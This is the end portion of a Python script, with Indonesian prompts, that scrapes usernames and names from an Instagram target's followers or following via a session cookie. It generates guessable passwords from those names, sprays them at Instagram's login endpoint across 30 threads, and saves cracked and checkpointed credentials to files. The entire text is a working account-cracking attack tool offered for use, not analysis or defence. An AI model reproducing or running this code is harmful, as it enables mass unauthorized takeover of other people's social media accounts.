        jumlah = int(input(' %s[%s+%s] limit : '%(N,H,N)))
        ask = user.replace(" ", "")
        cr.append("asw_lu")
        yan.append(ask+"|"+ask)
        yan.append(ask+"_"+"|"+ask)
        for x in range(1, jumlah+1):
            yan.append(ask+str(x)+"|"+ask)
            yan.append(ask+"_"+str(x)+"|"+ask)
            yan.append(ask+str(x)+"_"+"|"+ask)
        proses()
        peweh()
    elif pepek in['3','03']:
        dirs = os.listdir("results")
        print('\n [ hasil crack yang tersimpan di file anda ]\n')
        for file in dirs:
            print(" [%s+%s] %s"%(O,N,file))
        file = input("\n [%s?%s] masukan nama file :%s "%(M,N,H))
        if file == "":
            file = input("\n %s[%s?%s] masukan nama file :%s %s"%(N,M,N,H,N))
        total = open("results/%s"%(file)).read().splitlines()
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
        nm_file = ("%s"%(file)).replace("-", " ")
        hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
        jalan(" [%s*%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
            print("%s%s"%(titid,N));time.sleep(0.03)
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
        input('\n  [ %sKEMBALI%s ] '%(O,N));menu_igeh()
    elif pepek in['0','00']:
        moch_yayan()
    else:
        print('\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N));time.sleep(2);menu_igeh()

# FOLLOWERS IGEH
def __followers__(cookie, id_target, limit, kuntul):
    global looping
    if kuntul in[""]:
        print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);menu_igeh()
    elif kuntul in["1","01"]:
        url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count={}".format(id_target, limit)
    elif kuntul in["2","02"]:
        url = "https://i.instagram.com/api/v1/friendships/{}/following/?count={}".format(id_target, limit)
    else:
        print('\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,kuntul,N));time.sleep(2);menu_igeh()
    with requests.Session() as ses:
        otw = ses.get(url, cookies=cookie, headers=headerz_api)
        for xxx in json.loads(otw.content)["users"]:
            username = xxx["username"]
            nama = xxx["full_name"].encode("utf-8")
            if len(status_foll) != 1:
                sys.stdout.write('\r [\x1b[1;92m*\x1b[0m] sedang mengumpulkan %s id... '%(len(yan))); sys.stdout.flush()
                yan.append(username+"|"+nama.decode("utf-8"))
                #open('Tes-dump.txt','a').write(f'{username}|{nama.decode("utf-8")}\n')
                looping+=1
            else:
                poll.append(username)

#PW BARU
def peweh():
    with YayanGanteng(max_workers=30) as (__yayanXD__):
        for yntkts in yan:
            try:
                uid, name = yntkts.split('|')
                xz = name.split(' ')
                if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                    pwx = [name, xz[0]+"123", xz[0]+"12345"]
                else:
                    pwx = [name, xz[0]+"123", xz[0]+"12345"]
                __yayanXD__.submit(crack2, uid, pwx)
            except: pass
    exit(f"\n {N}[{H}#{N}] Crack selesai...")

# CLASS CRAK IG BARU
def crack2(user, pwx):
    global looping, loping
    asww = len(pwx)
    for pas in pwx:
        if looping != 1:
            pass
        else:
            if len(status_foll) != 1:
                sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,str(loping),len(yan),len(ok),len(cp))),
                sys.stdout.flush()
                asww -= 1
            else:
                pass
        try:
            if user in ok or user in cp:
                break
            pw = pas.lower()
            try:
                headerz = {"User-Agent": user_agentz_api}
                with requests.Session() as ses:
                    urll = "https://www.instagram.com/"
                    data = ses.get(urll, headers=headerz).content
                    tokett = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
                header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": tokett,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,
                         }
                param = {"username": user,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pw),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
                        }
            except:
                header = {}
                param = {}
                pass
            with requests.Session() as ses:
                url = "https://www.instagram.com/accounts/login/ajax/"
                respon = ses.post(url, data=param, headers=header)
                data = json.loads(respon.content);time.sleep(00.1)
                if "checkpoint_url" in str(data):
                    cepeh = "Checkpoint"
                    ingfo(user, pw, cepeh)
                    open('results/IG-CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" [×] "+user+"|"+pw+"\n")
                    cp.append(user)
                    break
                elif "userId" in str(data):
                    okeh = "Berhasil"
                    if len(status_foll) != 1:
                        ingfo(user, pw, okeh)
                        with open('results/IG-OK-%s-%s-%s.txt' % (ha, op, ta), 'a') as simpan:
                            simpan.write(" [✓] "+user+"|"+pw+"\n")
                        ok.append(user)
                    break
                elif "Please wait" in str(data):
                    sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik         '%(N,M,N)),
                    looping+=1
                    sys.stdout.flush()
                    pwx = [pw]
                    crack2(user, pwx)
                    loping -= 1
                else:
                    looping = 1
                    pass
        except requests.exceptions.ConnectionError:
            sys.stdout.write('\r %s[%s!%s] Tidak ada koneksi internet        '%(N,M,N)),
            sys.stdout.flush()
            looping+=1
            pwx = [pw]
            crack2(user, pwx)
            loping -= 1
        except:
            looping = 1
            pass
    loping+=1
# INGFO IG
def ingfo(user, pw, status):
    try:
        global idg, pengikut, mengikuti
        dta = requests.get("https://www.instagram.com/%s/?__a=1"%(user), headers={"User-Agent": user_agentz})
        dta_ = dta.json()["graphql"]["user"]
        nama = dta_["full_name"]
        idg = dta_["id"]
        pengikut = dta_["edge_followed_by"]["count"]
        mengikuti = dta_["edge_follow"]["count"]
        if status == "Berhasil":
            print(f"\r {N}[{H}#{N}] name      : {H}{nama}                 \n {N}[{H}#{N}] username  : {H}{user}                 \n {N}[{H}#{N}] password  : {H}{pw}                 \n {N}[{H}#{N}] followers : {H}{str(pengikut)}                 \n {N}[{H}#{N}] following : {H}{str(mengikuti)}                 \n")
        elif status == "Checkpoint":
            print(f"\n {N}[{K}#{N}] name      : {K}{nama}                 \n {N}[{K}#{N}] username  : {K}{user}                 \n {N}[{K}#{N}] password  : {K}{pw}                 \n {N}[{K}#{N}] followers : {K}{str(pengikut)}                 \n {N}[{K}#{N}] following : {K}{str(mengikuti)}                 \n")
        else:
            pass
    except: pass
loping= 1

if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()
